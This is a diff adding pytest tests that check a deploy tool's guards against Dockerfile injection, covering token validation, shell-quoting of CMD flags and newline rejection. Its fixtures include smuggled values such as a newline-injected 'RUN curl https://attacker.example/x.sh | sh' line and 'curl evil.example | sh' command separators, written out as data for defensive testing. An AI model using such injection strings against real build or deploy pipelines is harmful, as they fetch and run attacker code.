@@ -1164,3 +1164,345 @@ def test_to_agent_engine_extra_packages_requirements_txt_is_not_clobbered(
   assert (tmp_dir / "requirements.txt").read_text() == (
       "some-unrelated-package\n"
   )
+
+
+# Dockerfile injection guards
+_INJECTED_RUN = 'x"\nRUN curl https://attacker.example/x.sh | sh\n#'
+
+
+def _make_counting_vertexai(calls: List[str]) -> types.ModuleType:
+  """Returns a fake `vertexai` module that records every call it receives."""
+  fake_vertexai = types.ModuleType("vertexai")
+
+  class _FakeAgentEngines:
+
+    def create(self, **kwargs: Any) -> Any:
+      del kwargs
+      calls.append("create")
+      return types.SimpleNamespace(
+          api_resource=types.SimpleNamespace(
+              name="projects/p/locations/l/reasoningEngines/e"
+          )
+      )
+
+    def update(self, *, name: str, config: Dict[str, Any]) -> None:
+      del name
+      del config
+      calls.append("update")
+
+    def delete(self, *, name: str) -> None:
+      del name
+      calls.append("delete")
+
+  class _FakeVertexClient:
+
+    def __init__(self, *args: Any, **kwargs: Any) -> None:
+      del args
+      del kwargs
+      calls.append("client")
+      self.agent_engines = _FakeAgentEngines()
+
+  fake_vertexai.Client = _FakeVertexClient
+  return fake_vertexai
+
+
+def _gke_subprocess_mock(run_recorder: _Recorder) -> Callable[..., Any]:
+  """Returns a `subprocess.run` stand-in that answers the kubectl apply call."""
+
+  def _mock(*args: Any, **kwargs: Any) -> Any:
+    run_recorder(*args, **kwargs)
+    command_list = args[0]
+    if command_list and command_list[0:2] == ["kubectl", "apply"]:
+      return types.SimpleNamespace(
+          stdout="deployment.apps/gke-svc created\nservice/gke-svc created"
+      )
+    return None
+
+  return _mock
+
+
+def _to_gke_kwargs(src_dir: Path, tmp_path: Path) -> Dict[str, Any]:
+  """Returns a legitimate set of `to_gke` arguments."""
+  return {
+      "agent_folder": str(src_dir),
+      "project": "gke-proj",
+      "region": "us-east1",
+      "cluster_name": "my-gke-cluster",
+      "service_name": "gke-svc",
+      "app_name": "agent",
+      "temp_folder": str(tmp_path / "out"),
+      "port": 8080,
+      "trace_to_cloud": False,
+      "otel_to_cloud": False,
+      "with_ui": False,
+      "log_level": "info",
+      "adk_version": "1.2.0",
+  }
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "agent",
+        "my-agent_v2.1",
+        "my-project.example-123",
+        "us-central1",
+        "a" * 128,
+    ],
+)
+def test_assert_safe_dockerfile_token_accepts_plain_token(value: str) -> None:
+  """A plain token is accepted."""
+  assert cli_deploy._assert_safe_dockerfile_token(value, "app_name") is None
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        _INJECTED_RUN,
+        "agent\n",
+        "proj$(id)",
+        "my agent",
+        "a" * 129,
+        "agent/../etc",
+    ],
+)
+def test_assert_safe_dockerfile_token_rejects_unsafe_value(value: str) -> None:
+  """A value outside the token set is rejected, and the field is named."""
+  with pytest.raises(click.ClickException, match="Invalid app_name"):
+    cli_deploy._assert_safe_dockerfile_token(value, "app_name")
+
+
+@pytest.mark.parametrize("value", [None, ""])
+def test_assert_safe_dockerfile_token_skips_unset_value(
+    value: str | None,
+) -> None:
+  """An unset value is left alone, as `project=None` is today."""
+  assert cli_deploy._assert_safe_dockerfile_token(value, "project") is None
+
+
+def test_quote_dockerfile_cmd_value_quotes_shell_metacharacters() -> None:
+  """A value carrying a command separator is quoted whole."""
+  assert (
+      cli_deploy._quote_dockerfile_cmd_value(
+          "memory://; curl evil.example | sh #", "memory_service_uri"
+      )
+      == "'memory://; curl evil.example | sh #'"
+  )
+
+
+def test_quote_dockerfile_cmd_value_escapes_embedded_single_quote() -> None:
+  """An embedded single quote cannot close the quoting."""
+  assert (
+      cli_deploy._quote_dockerfile_cmd_value("a'; id #", "allow_origins")
+      == """'a'"'"'; id #'"""
+  )
+
+
+@pytest.mark.parametrize("newline", ["\n", "\r"])
+def test_quote_dockerfile_cmd_value_rejects_newline(newline: str) -> None:
+  """Quoting cannot contain a newline, so the value is rejected."""
+  with pytest.raises(click.ClickException, match="Invalid trigger_sources"):
+    cli_deploy._quote_dockerfile_cmd_value(
+        f"pubsub{newline}RUN id{newline}#", "trigger_sources"
+    )
+
+
+@pytest.mark.parametrize(
+    "value", ["http://localhost:3000,https://my-app.com", "pubsub,eventarc"]
+)
+def test_quote_dockerfile_cmd_value_leaves_ordinary_value_untouched(
+    value: str,
+) -> None:
+  """A legitimate value is byte-identical to what it is today."""
+  assert cli_deploy._quote_dockerfile_cmd_value(value, "allow_origins") == value
+
+
+@pytest.mark.parametrize("value", [None, ""])
+def test_dockerfile_cmd_flag_omits_an_unset_value(value: str | None) -> None:
+  """An unset value renders no flag at all."""
+  assert cli_deploy._dockerfile_cmd_flag("--trigger_sources", value) == ""
+
+
+def test_dockerfile_cmd_flag_quotes_the_value() -> None:
+  """A set value is rendered as the flag with its value quoted."""
+  assert (
+      cli_deploy._dockerfile_cmd_flag("--allow_origins", "http://a; id #")
+      == "--allow_origins='http://a; id #'"
+  )
+
+
+def test_dockerfile_cmd_flag_names_the_flag_when_rejecting() -> None:
+  """The rejection message names the flag the user passed."""
+  with pytest.raises(click.ClickException, match="Invalid allow_origins"):
+    cli_deploy._dockerfile_cmd_flag("--allow_origins", "http://a\nRUN id\n#")
+
+
+def test_get_service_option_by_adk_version_quotes_service_uri() -> None:
+  """A service URI carrying shell metacharacters is quoted."""
+  actual = cli_deploy._get_service_option_by_adk_version(
+      adk_version="1.2.0",
+      session_uri="sqlite:///a; curl evil.example | sh #",
+      artifact_uri=None,
+      memory_uri=None,
+  )
+
+  assert (
+      actual == "--session_service_uri='sqlite:///a; curl evil.example | sh #'"
+  )
+
+
+@pytest.mark.parametrize(
+    "field",
+    ["session_service_uri", "artifact_service_uri", "memory_service_uri"],
+)
+def test_get_service_option_by_adk_version_rejects_newline(field: str) -> None:
+  """A service URI carrying a newline is rejected, and the field is named."""
+  uris: Dict[str, str | None] = {
+      "session_uri": None,
+      "artifact_uri": None,
+      "memory_uri": None,
+  }
+  uris[field.replace("_service_uri", "_uri")] = f"sqlite:///a\n{_INJECTED_RUN}"
+
+  with pytest.raises(click.ClickException, match=f"Invalid {field}"):
+    cli_deploy._get_service_option_by_adk_version(adk_version="1.2.0", **uris)
+
+
+@pytest.mark.parametrize("field", ["app_name", "project", "region"])
+def test_to_gke_rejects_injected_token(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+    field: str,
+) -> None:
+  """A token carrying a new instruction fails before anything is deployed."""
+  src_dir = agent_dir(False, False)
+  run_recorder = _Recorder()
+  rmtree_recorder = _Recorder()
+  monkeypatch.setattr(subprocess, "run", _gke_subprocess_mock(run_recorder))
+  monkeypatch.setattr(shutil, "rmtree", rmtree_recorder)
+  kwargs = _to_gke_kwargs(src_dir, tmp_path)
+  kwargs[field] = _INJECTED_RUN
+
+  with pytest.raises(click.ClickException, match=f"Invalid {field}"):
+    cli_deploy.to_gke(**kwargs)
+
+  assert not run_recorder.calls
+  assert not rmtree_recorder.calls
+  assert not (tmp_path / "out" / "Dockerfile").exists()
+
+
+@pytest.mark.parametrize(
+    "field, overrides",
+    [
+        ("allow_origins", {"allow_origins": [f"http://a\n{_INJECTED_RUN}"]}),
+        ("trigger_sources", {"trigger_sources": f"pubsub\n{_INJECTED_RUN}"}),
+    ],
+)
+def test_to_gke_rejects_newline_in_cmd_value(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+    field: str,
+    overrides: Dict[str, Any],
+) -> None:
+  """A CMD value carrying a newline fails before anything is deployed."""
+  src_dir = agent_dir(False, False)
+  run_recorder = _Recorder()
+  monkeypatch.setattr(subprocess, "run", _gke_subprocess_mock(run_recorder))
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  kwargs = _to_gke_kwargs(src_dir, tmp_path)
+  kwargs.update(overrides)
+
+  with pytest.raises(click.ClickException, match=f"Invalid {field}"):
+    cli_deploy.to_gke(**kwargs)
+
+  assert not run_recorder.calls
+  assert not (tmp_path / "out" / "Dockerfile").exists()
+
+
+def test_to_gke_shell_quotes_cmd_values(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    tmp_path: Path,
+) -> None:
+  """Shell metacharacters in the CMD values are quoted in the Dockerfile."""
+  src_dir = agent_dir(False, False)
+  run_recorder = _Recorder()
+  monkeypatch.setattr(subprocess, "run", _gke_subprocess_mock(run_recorder))
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  kwargs = _to_gke_kwargs(src_dir, tmp_path)
+  kwargs.update(
+      allow_origins=["http://a; curl evil.example | sh #"],
+      trigger_sources="pubsub; id #",
+      session_service_uri="sqlite:///a; id #",
+  )
+
+  cli_deploy.to_gke(**kwargs)
+
+  dockerfile_content = (tmp_path / "out" / "Dockerfile").read_text()
+  assert (
+      "--allow_origins='http://a; curl evil.example | sh #'"
+      in dockerfile_content
+  )
+  assert "--trigger_sources='pubsub; id #'" in dockerfile_content
+  assert "--session_service_uri='sqlite:///a; id #'" in dockerfile_content
+
+
+@pytest.mark.parametrize(
+    "field, overrides",
+    [
+        ("project", {"project": f"p\n{_INJECTED_RUN}"}),
+        ("region", {"region": f"us-central1\n{_INJECTED_RUN}"}),
+        ("trigger_sources", {"trigger_sources": f"pubsub\n{_INJECTED_RUN}"}),
+    ],
+)
+def test_to_agent_engine_rejects_injected_value(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+    field: str,
+    overrides: Dict[str, Any],
+) -> None:
+  """An injected value fails before the Agent Platform client is built."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  calls: List[str] = []
+  monkeypatch.setitem(sys.modules, "vertexai", _make_counting_vertexai(calls))
+  src_dir = agent_dir(False, False)
+  kwargs: Dict[str, Any] = {
+      "agent_folder": str(src_dir),
+      "temp_folder": "tmp",
+      "project": "my-gcp-project",
+      "region": "us-central1",
+      "adk_version": "1.2.0",
+  }
+  kwargs.update(overrides)
+
+  with pytest.raises(click.ClickException, match=f"Invalid {field}"):
+    cli_deploy.to_agent_engine(**kwargs)
+
+  assert not calls
+  assert not (src_dir.parent / "tmp" / "Dockerfile").exists()
+
+
+def test_to_agent_engine_shell_quotes_trigger_sources(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: Callable[[bool, bool], Path],
+) -> None:
+  """Shell metacharacters in trigger_sources are quoted in the Dockerfile."""
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  calls: List[str] = []
+  monkeypatch.setitem(sys.modules, "vertexai", _make_counting_vertexai(calls))
+  src_dir = agent_dir(False, False)
+
+  cli_deploy.to_agent_engine(
+      agent_folder=str(src_dir),
+      temp_folder="tmp",
+      project="my-gcp-project",
+      region="us-central1",
+      adk_version="1.2.0",
+      trigger_sources="pubsub; id #",
+  )
+
+  dockerfile_content = (src_dir.parent / "tmp" / "Dockerfile").read_text()
+  assert "--trigger_sources='pubsub; id #'" in dockerfile_content
+  assert calls == ["client", "create", "update"]
